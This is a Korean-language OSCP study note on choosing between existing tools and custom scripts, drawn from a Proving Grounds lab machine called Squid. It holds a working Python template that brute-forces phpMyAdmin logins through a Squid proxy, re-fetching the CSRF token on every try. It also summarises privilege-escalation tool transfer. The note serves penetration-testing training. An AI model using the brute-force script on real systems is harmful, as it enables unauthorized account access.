# 07. 툴 사용 vs 커스텀 스크립팅

핵심 결론: 공격의 뼈대(방법론)는 기존 툴, 마지막 20%는 상황에 맞는 커스텀(sh/python).
OffSec 머신은 "기존 툴이 그대로 먹히게" 설계되지 않았다. 툴이 막히는 지점 자체가 난이도 커브이고, OSCP가 보는 건 툴 지식이 아니라 툴이 안 될 때 수동으로 밀고 들어가는 능력이다.

## 1. 실전 사례 — Squid (PG)

| 툴 실패 | 원인 | 커스텀/우회 해법 |
|---------|------|------------------|
| Hydra 브루트포스 전멸 | phpMyAdmin 세션 쿠키 + 매번 바뀌는 CSRF 토큰 | Python: 매 시도 `GET 토큰 획득 → 쿠키 유지 → POST` 체인 → `root` 빈 패스워드 획득 |
| proxychains + nmap 전멸 | Squid ACL이 CONNECT 거부 (`deny CONNECT !SSL_ports`) | forward GET 기반 스캔 (spose / curl 루프) |
| PrintSpoofer 다운로드 실패 | 공격자 웹서버 경로/루트 문제 | 서빙 위치 조정 후 `Invoke-WebRequest`로 재전송 |

교훈: 기본 툴이 막혔을 때 그대로 접지 말고, 막힌 원인(프로토콜/ACL/인증 로직)을 파악하면 우회가 보인다.

## 2. 판단 기준 — 뭘 쓰고 뭘 짜나

| 상황 | 판단 |
|------|------|
| 정찰, 열거, 스캔 | 기존 툴 (nmap, linpeas, feroxbuster) — 직접 짜면 시간 낭비 |
| 툴이 에러 냈을 때 | 먼저 에러 읽기 — 90%는 옵션/경로/환경 문제 |
| 인증 로직이 특이함 (CSRF, 세션, 다단계) | 커스텀 Python (`requests`) — 툴로 못 이김 |
| 공개 익스플로잇 | 수정해서 쓰는 게 전제 (오프셋, 페이로드, 경로, URL) — 시험이 기대하는 것 |
| 반복 작업 | bash 루프 한 줄 or 10줄짜리 sh |

## 3. requests 기본 템플릿 (암기용 ~20줄)

세션 유지 + CSRF 재획득 + 프록시. 로그인 자동화·토큰 리프레시·업로드 자동화가 전부 이 변형이다.

```python
#!/usr/bin/env python3
"""login_brute.py — 세션 + CSRF + 프록시 브루트포스 템플릿"""
import re, sys, requests

TARGET = "http://127.0.0.1:8080/phpmyadmin/index.php"
s = requests.Session()
s.proxies = {"http": "http://192.168.112.189:3128",
             "https": "http://192.168.112.189:3128"}

def get_token():
    r = s.get(TARGET, timeout=10)                      # 1) 매 시도 토큰 재획득
    m = re.search(r'name="token" value="([^"]+)"', r.text)
    return m.group(1) if m else None

def try_login(user, password):
    data = {"pma_username": user, "pma_password": password,
            "server": "2", "target": "index.php", "token": get_token()}
    r = s.post(TARGET, data=data, timeout=10)          # 2) 쿠키는 세션이 유지
    return "Access denied" not in r.text               # 3) 실패 판정문

users, passes = sys.argv[1], sys.argv[2]
for user in open(users, errors="ignore"):
    for pw in open(passes, errors="ignore"):
        if try_login(user.strip(), pw.strip()):
            sys.exit(f"[+] FOUND: {user.strip()} / {pw.strip()!r}")
print("[-] not found")
```

## 4. OSCP 실전 수칙

1. 에러 메시지를 먼저 읽는다. 툴 교체보다 옵션/환경 확인이 먼저.
2. 공개 익스플로잇 수정 두려워하지 않기 — 안 돌리려 하지 말고 `print`로 중간값 찍어보며 고치는 감각. 시험장에서 가장 시간을 아껴주는 스킬.
3. 단, 과하지 말 것 — 시험에서는 "돌아가는 쓰레기 스크립트"가 완성된 작품보다 낫다. 커스텀에 30분 넘게 쓰고 있으면 접근 자체를 재검토.
4. 성공한 커스텀은 자산화 — README 기록 + 치트시트화. (`brute_pma.py`, `generate_port.sh`, `squid_scan.sh` 등은 다음 머신에서 재활용)

## 5. 함께 보기

- Squid 전체 과정 기록: `../../Squid/README.md`
- proxychains + nmap 불가 조합 경고: `../cheatsheets/05-lateral-movement/pivoting/proxy/proxychains.md` 5절
- 포트 스캔 스크립트: `../../Squid/tmp/generate_port.sh`
